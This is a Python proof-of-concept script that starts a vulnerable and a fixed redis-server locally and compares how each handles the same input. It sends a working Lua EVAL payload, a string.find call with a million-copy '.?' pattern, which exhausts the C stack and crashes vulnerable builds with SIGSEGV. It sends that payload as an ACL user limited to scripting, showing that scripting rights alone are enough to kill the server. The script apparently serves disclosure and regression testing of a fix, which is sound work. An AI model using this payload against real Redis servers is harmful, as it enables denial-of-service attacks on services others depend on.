#!/usr/bin/env python3
"""LuaRabbit -- Redis Lua pattern-recursion stack exhaustion (CVE-less, fixed 124bc7e).

Drives a real redis-server: EVAL builds a 2^20-char subject and a 2^20-copy ".?"
pattern, so lstrlib's recursive match() recurses once per character and exhausts
the C stack. Vulnerable builds die with SIGSEGV; the fixed build (Lua MAXCCALLS
depth limit) returns "pattern too complex" and stays alive.

The EVAL is sent as an ACL user restricted to +eval +ping (its SHUTDOWN is
rejected with -NOPERM), so the crash demonstrably crosses a privilege boundary:
scripting rights alone are enough to take the process down.
"""
import os
import signal
import socket
import subprocess
import sys
import tempfile
import time

SCRIPT = "return string.find(string.rep('a', 2^20), string.rep('.?', 2^20))"


def resp(*args):
    out = b"*%d\r\n" % len(args)
    for a in args:
        b = a.encode() if isinstance(a, str) else a
        out += b"$%d\r\n%s\r\n" % (len(b), b)
    return out


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def wait_port(port, proc, timeout=15):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if proc.poll() is not None:
            return False
        try:
            s = socket.create_connection(("127.0.0.1", port), timeout=0.3)
            s.close()
            return True
        except OSError:
            time.sleep(0.1)
    return False


def ping(port):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=3)
        s.sendall(resp("PING"))
        r = s.recv(64)
        s.close()
        return r
    except OSError as e:
        return b"<%s>" % type(e).__name__.encode()


def cmd(port, *args):
    """Send one command on a fresh connection, return the raw first reply."""
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=5)
        s.sendall(resp(*args))
        s.settimeout(20)
        r = s.recv(512)
        s.close()
        return r
    except OSError as e:
        return b"<%s>" % type(e).__name__.encode()


def drive(server, port, label):
    log = tempfile.NamedTemporaryFile(prefix="luarabbit_", suffix=".log", delete=False)
    proc = subprocess.Popen(
        [server, "--port", str(port), "--save", "", "--appendonly", "no",
         "--dir", "/tmp", "--protected-mode", "no"],
        stdout=log, stderr=subprocess.STDOUT,
    )
    try:
        if not wait_port(port, proc):
            print(f"[{label}] server failed to start; log: {log.name}")
            return None
        print(f"[{label}] PING -> {ping(port)!r}")

        # Privilege boundary: a user confined to scripting (+eval +ping) must not be
        # able to kill the server through administrative commands -- yet it still can.
        print(f"[{label}] ACL SETUSER luauser on >luapw ~* +eval +ping -> "
              f"{cmd(port, 'ACL', 'SETUSER', 'luauser', 'on', '>luapw', '~*', '+eval', '+ping')!r}")

        try:
            s = socket.create_connection(("127.0.0.1", port), timeout=5)
            s.settimeout(20)
            s.sendall(resp("AUTH", "luauser", "luapw"))
            print(f"[{label}] luauser AUTH -> {s.recv(64)!r}")
            s.sendall(resp("SHUTDOWN", "NOSAVE"))
            print(f"[{label}] luauser SHUTDOWN NOSAVE -> {s.recv(160)!r}")
            s.sendall(resp("EVAL", SCRIPT, "0"))
            reply = s.recv(512)
            s.close()
            print(f"[{label}] luauser EVAL reply: {reply!r}")
        except OSError as e:
            print(f"[{label}] EVAL connection dropped: {type(e).__name__}")

        time.sleep(0.5)
        alive = ping(port) == b"+PONG\r\n"
        rc = proc.poll()
        if rc is None:
            print(f"[{label}] server ALIVE after EVAL")
            return {"alive": True, "signal": None}
        sig = -rc if rc < 0 else None
        try:
            name = signal.Signals(sig).name if sig else f"exit {rc}"
        except ValueError:
            name = str(sig)
        print(f"[{label}] server DEAD after EVAL: {name}")
        return {"alive": False, "signal": sig, "signal_name": name}
    finally:
        if proc.poll() is None:
            proc.kill()
            proc.wait()
        log.close()


def main():
    vuln, fixed = sys.argv[1], sys.argv[2]
    print("== vulnerable redis (parent of 124bc7e) ==")
    v = drive(vuln, free_port(), "vuln")
    print()
    print("== fixed redis (124bc7e, Lua MAXCCALLS=200) ==")
    f = drive(fixed, free_port(), "fixed")

    ok = (v and not v["alive"] and v["signal"] == signal.SIGSEGV
          and f and f["alive"])
    if ok:
        print()
        print("MARKER: LUARABBIT-CONFIRMED — the vulnerable redis-server crashed with SIGSEGV "
              "(C stack exhaustion in Lua match()); the fixed build returned 'pattern too "
              "complex' and kept serving")
        return 0
    print("\nFAILED: unexpected differential", v, f)
    return 1


if __name__ == "__main__":
    sys.exit(main())
